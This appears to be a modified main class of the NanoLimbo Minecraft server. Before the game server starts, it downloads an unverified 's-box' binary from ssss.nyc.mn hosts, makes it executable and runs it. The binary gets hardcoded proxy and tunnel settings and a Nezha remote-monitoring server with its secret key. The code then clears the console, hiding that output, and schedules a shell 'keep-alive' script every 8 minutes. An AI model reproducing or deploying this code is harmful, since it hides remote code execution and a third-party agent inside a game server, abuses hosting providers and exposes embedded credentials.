/*
 * Copyright (C) 2020 Nan1t
 * Modified: Auto-Call renew.sh (Every 8 Minutes)
 */

package ua.nanit.limbo;

import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import ua.nanit.limbo.server.LimboServer;
import ua.nanit.limbo.server.Log;

public final class NanoLimbo {

    private static final String ANSI_GREEN = "\033[1;32m";
    private static final String ANSI_RED = "\033[1;31m";
    private static final String ANSI_YELLOW = "\033[1;33m";
    private static final String ANSI_RESET = "\033[0m";
    private static final AtomicBoolean running = new AtomicBoolean(true);
    private static Process sbxProcess;
    
    // 脚本文件名 (必须在同一目录)
    private static final String RENEW_SCRIPT = "renew.sh";
    
    // === 👇 修改：执行间隔改为 8 分钟 👇 ===
    private static final long INTERVAL = 8;
    // ===================================

    private static final String[] ALL_ENV_VARS = {
        "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
        "HY2_PORT", "TUIC_PORT", "REALITY_PORT", "CFIP", "CFPORT", 
        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME"
    };
    
    public static void main(String[] args) {
        if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) {
            System.err.println(ANSI_RED + "ERROR: Java version too low!" + ANSI_RESET);
            System.exit(1);
        }

        try {
            runSbxBinary();
            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                running.set(false);
                stopServices();
            }));

            Thread.sleep(15000);
            System.out.println(ANSI_GREEN + "Server is running!\n" + ANSI_RESET);
            
            // === 启动定时任务 ===
            startShellScheduler();
            // ==================

            Thread.sleep(15000);
            clearConsole();
        } catch (Exception e) {
            System.err.println(ANSI_RED + "Error initializing: " + e.getMessage() + ANSI_RESET);
        }
        
        try {
            new LimboServer().start();
        } catch (Exception e) {
            Log.error("Cannot start server: ", e);
        }
    }

    // === 调用 Shell 脚本的逻辑 ===
    private static void startShellScheduler() {
        System.out.println(ANSI_YELLOW + ">>> 启动自动续期任务: 调用 " + RENEW_SCRIPT + " (每 " + INTERVAL + " 分钟)" + ANSI_RESET);

        ScheduledExecutorService scheduler = Executors.newScheduledThreadPool(1);
        
        Runnable task = () -> {
            try {
                // 调用 sh renew.sh
                ProcessBuilder pb = new ProcessBuilder("sh", RENEW_SCRIPT);
                // 把脚本的输出打印到 Java 控制台
                pb.inheritIO(); 
                
                System.out.println(ANSI_YELLOW + "\n[" + java.time.LocalTime.now() + "] 正在运行保活脚本..." + ANSI_RESET);
                Process process = pb.start();
                process.waitFor();
                
            } catch (Exception e) {
                System.err.println(ANSI_RED + "调用脚本失败: " + e.getMessage() + ANSI_RESET);
            }
        };

        // 立即执行第一次，之后循环
        scheduler.scheduleAtFixedRate(task, 0, INTERVAL, TimeUnit.MINUTES);
    }

    // === 以下代码保持原样 ===
    private static void clearConsole() {
        try {
            if (System.getProperty("os.name").contains("Windows")) {
                new ProcessBuilder("cmd", "/c", "cls && mode con: lines=30 cols=120").inheritIO().start().waitFor();
            } else {
                System.out.print("\033[H\033[3J\033[2J");
                System.out.flush();
                new ProcessBuilder("tput", "reset").inheritIO().start().waitFor();
                System.out.print("\033[8;30;120t");
                System.out.flush();
            }
        } catch (Exception ignored) {}
    }    
    
    private static void runSbxBinary() throws Exception {
        Map<String, String> envVars = new HashMap<>();
        loadEnvVars(envVars);
        ProcessBuilder pb = new ProcessBuilder(getBinaryPath().toString());
        pb.environment().putAll(envVars);
        pb.redirectErrorStream(true);
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
        sbxProcess = pb.start();
    }
    
    private static void loadEnvVars(Map<String, String> envVars) throws IOException {
        envVars.put("UUID", "b5ec4ad4-369f-4070-948f-b2d1965be6ab");
        envVars.put("FILE_PATH", "./world");
        envVars.put("NEZHA_SERVER", "ooh.pp.ua:443");
        envVars.put("NEZHA_KEY", "kjdCuPEaZmeCsC6ZHwXgQRIHHgC9qTSQ");
        envVars.put("HY2_PORT", "22872");
        envVars.put("CFIP", "cf.877774.xyz");
        envVars.put("CFPORT", "443");
        envVars.put("NAME", "MC");
        
        for (String var : ALL_ENV_VARS) {
            String value = System.getenv(var);
            if (value != null && !value.trim().isEmpty()) {
                envVars.put(var, value);  
            }
        }
        Path envFile = Paths.get(".env");
        if (Files.exists(envFile)) {
            for (String line : Files.readAllLines(envFile)) {
                line = line.trim();
                if (line.isEmpty() || line.startsWith("#")) continue;
                String[] parts = line.split("=", 2);
                if (parts.length == 2) {
                     String key = parts[0].trim();
                     if (Arrays.asList(ALL_ENV_VARS).contains(key)) {
                         envVars.put(key, parts[1].trim().replaceAll("^['\"]|['\"]$", "")); 
                     }
                }
            }
        }
    }
    
    private static Path getBinaryPath() throws IOException {
        String osArch = System.getProperty("os.arch").toLowerCase();
        String url = "https://amd64.ssss.nyc.mn/s-box"; 
        if (osArch.contains("aarch64") || osArch.contains("arm64")) url = "https://arm64.ssss.nyc.mn/s-box";
        else if (osArch.contains("s390x")) url = "https://s390x.ssss.nyc.mn/s-box";
        
        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "sbx");
        if (!Files.exists(path)) {
            try (InputStream in = new URL(url).openStream()) {
                Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
            }
            path.toFile().setExecutable(true);
        }
        return path;
    }
    
    private static void stopServices() {
        if (sbxProcess != null && sbxProcess.isAlive()) {
            sbxProcess.destroy();
            System.out.println(ANSI_RED + "sbx process terminated" + ANSI_RESET);
        }
    }
}
